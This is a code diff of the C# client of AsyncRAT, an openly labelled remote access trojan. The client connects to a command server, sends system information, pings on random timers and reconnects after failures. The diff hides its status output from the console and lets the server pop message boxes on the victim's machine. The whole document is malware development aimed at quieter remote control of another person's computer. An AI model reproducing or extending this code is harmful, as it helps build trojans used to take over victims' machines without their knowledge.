@@ -2,11 +2,12 @@
 using Microsoft.VisualBasic;
 using Microsoft.VisualBasic.Devices;
 using System;
+using System.Diagnostics;
 using System.IO;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading;
-
+using System.Windows.Forms;
 
 //       │ Author     : NYAN CAT
 //       │ Name       : AsyncRAT // Simple Socket
@@ -24,7 +25,7 @@ namespace Client
         public static byte[] Buffer { get; set; }
         public static long Buffersize { get; set; }
         public static bool BufferRecevied { get; set; }
-        public static Timer Tick { get; set; }
+        public static System.Threading.Timer Tick { get; set; }
         public static MemoryStream MS { get; set; }
 
         static void Main(string[] args)
@@ -46,19 +47,19 @@ namespace Client
                 client.ReceiveTimeout = -1;
                 client.SendTimeout = -1;
                 client.Connect("127.0.0.1", 8080);
-                Console.WriteLine("Connected!");
+                Debug.WriteLine("Connected!");
                 Buffer = new byte[1];
                 Buffersize = 0;
                 BufferRecevied = false;
                 MS = new MemoryStream();
                 BeginSend(SendInfo());
                 TimerCallback T = new TimerCallback(Ping);
-                Tick = new Timer(T, null, new Random().Next(30 * 1000, 60 * 1000), new Random().Next(30 * 1000, 60 * 1000));
+                Tick = new System.Threading.Timer(T, null, new Random().Next(30 * 1000, 60 * 1000), new Random().Next(30 * 1000, 60 * 1000));
                 client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
             }
             catch
             {
-                Console.WriteLine("Disconnected!");
+                Debug.WriteLine("Disconnected!");
                 Thread.Sleep(new Random().Next(1 * 1000, 6 * 1000));
                 Reconnect();
             }
@@ -160,19 +161,17 @@ namespace Client
         {
             MsgPack unpack_msgpack = new MsgPack();
             unpack_msgpack.DecodeFromBytes((byte[])Data);
-            Console.WriteLine("I recevied a packet from server: " + unpack_msgpack.ForcePathObject("Packet").AsString);
             switch (unpack_msgpack.ForcePathObject("Packet").AsString)
             {
                 case "MessageBox":
                     {
-                        Console.WriteLine(unpack_msgpack.ForcePathObject("Message").AsString);
+                        MessageBox.Show(unpack_msgpack.ForcePathObject("Message").AsString);
                     }
                     break;
 
                 case "Ping":
                     {
-
-                        Console.WriteLine("Server Pinged me " + unpack_msgpack.ForcePathObject("Message").AsString);
+                        Debug.WriteLine("Server Pinged me " + unpack_msgpack.ForcePathObject("Message").AsString);
                     }
                     break;
             }
